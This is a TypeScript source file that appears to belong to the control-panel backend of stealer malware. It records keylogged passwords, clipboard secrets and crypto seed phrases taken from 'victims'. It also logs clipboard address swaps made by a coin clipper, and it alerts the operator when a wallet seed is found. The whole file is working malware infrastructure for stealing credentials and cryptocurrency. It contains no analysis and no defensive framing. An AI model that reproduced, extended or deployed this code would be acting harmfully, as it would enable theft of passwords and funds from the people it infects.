import { createHash } from 'node:crypto';
import { prisma } from './db';
import { publish } from './bus';
import { notify } from '../services/notify';

export type EventInput = { kind: string; data: Record<string, unknown>; legacy: string };

function text(value: unknown, max: number): string {
  return typeof value === 'string' ? value.slice(0, max) : '';
}

/** One password row per process+title inside five minutes, with a counter. */
async function recordPassword(victimId: string, process: string, title: string, body: string): Promise<void> {
  const since = new Date(Date.now() - 5 * 60_000);
  const existing = await prisma.keylog.findFirst({
    where: { victimId, process, title, password: true, updatedAt: { gte: since } },
    orderBy: { updatedAt: 'desc' }
  }).catch(() => null);
  if (existing) {
    await prisma.keylog.update({
      where: { id: existing.id },
      data: { text: body, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
    }).catch(() => undefined);
    return;
  }
  await prisma.keylog.create({ data: { victimId, process, title, text: body, password: true } });
}

/** Clipboard floods collapse onto one row per kind+content inside a minute. */
async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null): Promise<void> {
  const since = new Date(Date.now() - 60_000);
  const existing = content
    ? await prisma.clipboardEntry.findFirst({
      where: { victimId, kind, content, updatedAt: { gte: since } },
      orderBy: { updatedAt: 'desc' }
    }).catch(() => null)
    : null;
  if (existing) {
    await prisma.clipboardEntry.update({
      where: { id: existing.id },
      data: { replaced, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
    }).catch(() => undefined);
    return;
  }
  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process: '', window: '', content, kind, replaced } });
}

/** Persist a structured event and mirror it onto the typed tables. */
export async function applyEvent(victimId: string, event: EventInput): Promise<void> {
  const { kind, data } = event;
  await prisma.event.create({ data: { victimId, kind, data: data as never } });

  if (kind === 'password') {
    await recordPassword(victimId, text(data.process, 260), text(data.title, 512), text(data.text, 4096) || event.legacy);
  } else if (kind === 'clipboard_secret') {
    const value = text(data.value, 4096);
    await recordClipboard(victimId, text(data.kind, 16) || 'text', value, null);
    if (value && String(data.kind ?? '').startsWith('seed')) await seedFound(victimId, value);
  } else if (kind === 'clipboard_replace') {
    const original = text(data.original, 256);
    if (original) await recordClipboard(victimId, text(data.coin, 16) || 'replace', original, text(data.replacement, 256) || null);
  } else if (kind === 'seed_found') {
    await seedFound(victimId, text(data.value, 4096));
  }

  void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, legacy: event.legacy } });
}

async function seedFound(victimId: string, value: string): Promise<void> {
  if (!value) return;
  await notify({
    kind: 'seed',
    victimId,
    title: 'Seed found',
    body: value.slice(0, 160),
    link: `/victims/${victimId}`,
    dedupeKey: `seed:${victimId}:${createHash('sha256').update(value).digest('hex')}`
  }).catch(() => undefined);
}
